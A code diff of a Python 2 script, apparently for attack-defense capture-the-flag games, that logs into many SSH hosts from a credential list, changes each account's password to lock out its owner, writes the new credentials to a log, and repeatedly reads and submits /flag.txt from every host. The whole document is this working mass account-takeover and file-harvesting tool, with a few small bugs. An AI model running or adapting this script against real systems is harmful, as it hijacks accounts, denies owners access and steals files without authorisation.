@@ -6,81 +6,16 @@ import time
 import random
 import hashlib
 import string
+import sys
+# from submit_flag import submit_flag
+
+def submit_flag(flag):
+    print "[+] Submiting flag : %s" % (flag)
+    return True
 
 timeout = 3
 
-def login_with_password(host, port, username, password):
-    # login via password
-    ssh = paramiko.SSHClient()
-    ssh.load_system_host_keys()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=timeout)
-        return (True, ssh)
-    except Exception as e:
-        return (False, str(e))
-
-
-def login_with_key(host, port, username, key_file):
-    # login via key
-    private_key = paramiko.RSAKey._from_private_key_file(key_file)
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(hostname=host, port=port, username=username, key=private_key, timeout=timeout)
-        return (True, ssh)
-    except Exception as e:
-        return (False, str(e))
-
-def exec_command(ssh, command):
-    stdin, stdout, stderr = ssh.exec_command(command)
-    return (stdin, stdout, stderr)
-
-def exec_command_print(ssh, command):
-    stdin, stdout, stderr = exec_command(ssh, command)
-    print "-" * 0x10 + " STDOUT " + "-" * 0x10
-    print stdout.read()
-    print "-" * 0x10 + " STDERR " + "-" * 0x10
-    print stderr.read()
-    return (stdin, stdout, stderr)
-
-def check_root(ssh):
-    stdin, stdout, stderr = exec_command(ssh, "uname")
-    result = stdout.read()
-    return ("uid=0" in result, result)
-
-
-def change_password(ssh, old_password, new_password):
-    is_root = check_root(ssh)
-    if is_root[0]:
-        print "[+] Root user detected! (%s)" % (is_root[1])
-        stdin, stdout, stderr = exec_command(ssh, "passwd")
-        stdin.write("%s\n" % (new_password))
-        stdin.write("%s\n" % (new_password))
-        print "-" * 0x10 + " STDOUT " + "-" * 0x10
-        print stdout.read()[:-1]
-        print "-" * 0x10 + " STDERR " + "-" * 0x10
-        error_message = stderr.read()[:-1]
-        print error_message
-        if "success" in error_message:
-            return True
-        else:
-            return False
-    else:
-        print "[+] Not a root user! (%s)" % (is_root[1])
-        stdin, stdout, stderr = exec_command(ssh, "passwd")
-        stdin.write("%s\n" % (old_password))
-        stdin.write("%s\n" % (new_password))
-        stdin.write("%s\n" % (new_password))
-        print "-" * 0x10 + " STDOUT " + "-" * 0x10
-        print stdout.read()[:-1]
-        print "-" * 0x10 + " STDERR " + "-" * 0x10
-        error_message = stderr.read()[:-1]
-        print error_message
-        if "success" in error_message:
-            return True
-        else:
-            return False
+ssh_clients = []
 
 def md5(content):
     return hashlib.md5(content).hexdigest()
@@ -92,80 +27,129 @@ def random_string(length):
         result += random.choice(random_range)
     return result
 
-def auto_change_password_with_password(target):
-    print "-" * 32
-    host = target[0]
-    port = int(target[1])
-    username = target[2]
-    password = target[3]
-    salt = random_string(32)
-    new_password = md5("%s:%d:%s:%s:%s" % (host, port, username, password, salt))
+class SSHClient():
+    def __init__(self, host, port, username, auth, timeout=5):
+        self.is_root = False
+        self.host = host
+        self.port = port
+        self.username = username
+        self.ssh_session = paramiko.SSHClient()
+        self.ssh_session.load_system_host_keys()
+        self.ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if auth[0]:
+            self.password = auth[1]
+            self.ssh_session.connect(hostname=self.host, port=self.port, username=self.username, password=self.password, timeout=timeout)
+        else:
+            self.key_file = auth[1]
+            private_key = paramiko.RSAKey._from_private_key_file(self.key_file)
+            self.ssh_session.connect(hostname=host, port=port, username=username, key=private_key, timeout=timeout)
 
-    print "Host : %s" % (host)
-    print "Port : %s" % (port)
-    print "User : %s" % (username)
-    print "Pass : %s" % (password)
-    print "NewP : %s" % (new_password)
-    print "Trying to login..."
-    result = login_with_password(host, port, username, password)
-    if result[0]:
-        ssh = result[1]
-        print "[+] Login success!"
-        print "[+] Trying to change password [%s] => [%s]" % (password, new_password)
-        change_password(ssh, password, new_password)
-        with open("ssh.log", "a+") as f:
-            content = "%s:%s@%s:%d => %s\n" % (username, password, host, port, new_password)
-            f.write(content)
-        print "[+] Closing conneciton..."
-        ssh.close()
-        print "[+] Connection closed!"
-    else:
-        print "[-] Login error!"
-        print "[-] %s" % (result[1])
+    def infomation(self):
+        return "%s:%s:%s:%s" % (self.username, self.password, self.host, self.port)
 
-def auto_change_password_with_key(target):
-    print "-" * 32
-    host = target[0]
-    port = int(target[1])
-    username = target[2]
-    key_path = target[3]
-    salt = random_string(32)
-    new_password = md5("%s:%d:%s:%s" % (host, port, username, salt))
+    def exec_command(self, command):
+        (stdin, stdout, stderr) = self.ssh_session.exec_command(command)
+        return (stdin, stdout, stderr)
 
-    print "Host : %s" % (host)
-    print "Port : %s" % (port)
-    print "User : %s" % (username)
-    print "File : %s" % (key_path)
-    print "NewP : %s" % (new_password)
-    print "Trying to login..."
-    result = login_with_key(host, port, username, key_path)
-    if result[0]:
-        ssh = result[1]
-        print "[+] Login success!"
-        #print "[+] Trying to change password [%s] => [%s]" % (password, new_password)
-        #change_password(ssh, password, new_password)
-        #with open("ssh.log", "a+") as f:
-        #    content = "%s:%s@%s:%d => %s\n" % (username, password, host, port, new_password)
-        #    f.write(content)
-        #print "[+] Closing conneciton..."
-        ssh.close()
-        #print "[+] Connection closed!"
-    else:
-        print "[-] Login error!"
-        print "[-] %s" % (result[1])
+    def exec_command_print(ssh, command):
+        stdin, stdout, stderr = self.exec_command(command)
+        print "-" * 0x10 + " STDOUT " + "-" * 0x10
+        print stdout.read()
+        print "-" * 0x10 + " STDERR " + "-" * 0x10
+        print stderr.read()
+        return (stdin, stdout, stderr)
+
+    def check_root(self):
+        stdin, stdout, stderr = self.exec_command("id")
+        result = stdout.read()
+        return ("uid=0" in result, result)
+
+    def change_password(self, new_password):
+        is_root = self.check_root()
+        if is_root[0]:
+            self.is_root = True
+            print "[+] Root user detected!"
+            stdin, stdout, stderr = self.exec_command("passwd")
+            stdin.write("%s\n" % (new_password))
+            stdin.write("%s\n" % (new_password))
+            stdout.read()
+            error_message = stderr.read()[:-1]
+            if "success" in error_message:
+                self.password = new_password
+                return True
+            else:
+                return False
+        else:
+            self.is_root = False
+            print "[+] Not a root user! (%s)" % (is_root[1])
+            stdin, stdout, stderr = self.exec_command("passwd")
+            stdin.write("%s\n" % (self.password))
+            stdin.write("%s\n" % (new_password))
+            stdin.write("%s\n" % (new_password))
+            stdout.read()
+            error_message = stderr.read()[:-1]
+            if "success" in error_message:
+                self.password = new_password
+                return True
+            else:
+                return False
+
+    def save_info(self, filename):
+        with open(filename, "a+") as f:
+            f.write("%s\n" % (self.infomation()))
+
+
+def get_flag(ssh_client):
+    flag = ssh_client.exec_command("cat /flag.txt")[1].read().strip("\n\t ")
+    return flag
 
 def main():
-    '''
-    with open("ssh_targets_with_password") as f:
+    if len(sys.argv) != 2:
+        print "Usage : \n\tpython %s [FILENAME]" % (sys.argv[0])
+        exit(1)
+    round_time = 60
+    filename = sys.argv[1]
+    print "[+] Loading file : %s" % (filename)
+    with open(filename) as f:
         for line in f:
-            data = line.replace("\n", "").split(" ")
-            auto_change_password_with_password(data)
-            '''
-    with open("ssh_targets_with_key") as f:
-        for line in f:
-            data = line.replace("\n", "").split(" ")
-            auto_change_password_with_key(data)
-
+            line = line.rstrip("\n")
+            data = line.split(":")
+            username = data[0]
+            password = data[1]
+            host = data[2]
+            port = int(data[3])
+            auth = (True, password)
+            print "[+] Trying login : %s" % (line)
+            try:
+                ssh_client = SSHClient(host, port, username, auth, timeout=5)
+                ssh_clients.append(ssh_client)
+            except Exception as e:
+                print "[-] %s" % (e)
+    print "[+] Login step finished!"
+    print "[+] Got [%d] clients!" % (len(ssh_clients))
+    print "[+] Starting changing password..."
+    for ssh_client in ssh_clients:
+        new_password = md5(random_string(0x20))
+        if ssh_client.change_password(new_password):
+            ssh_client.save_info("success.log")
+            print "[+] %s => %s (Success!)" % (ssh_client.infomation(), new_password)
+        else:
+            print "[-] %s => %s (Failed!)" % (ssh_client.infomation(), new_password)
+    print "[+] Starting get flag..."
+    while True:
+        if len(ssh_clients) == 0:
+            print "[+] No client... Breaking..."
+            break
+        for ssh_client in ssh_clients:
+            flag = get_flag(ssh_client)
+            print "[+] Flag : %s" % (flag)
+            if submit_flag(flag):
+                print "[+] Submit success!"
+            else:
+                print "[-] Submit failed!"
+        for i in range(round_time):
+            print "[+] Waiting : %s seconds..." % (round_time - i)
+            time.sleep(i)
 
 if __name__ == "__main__":
     main()
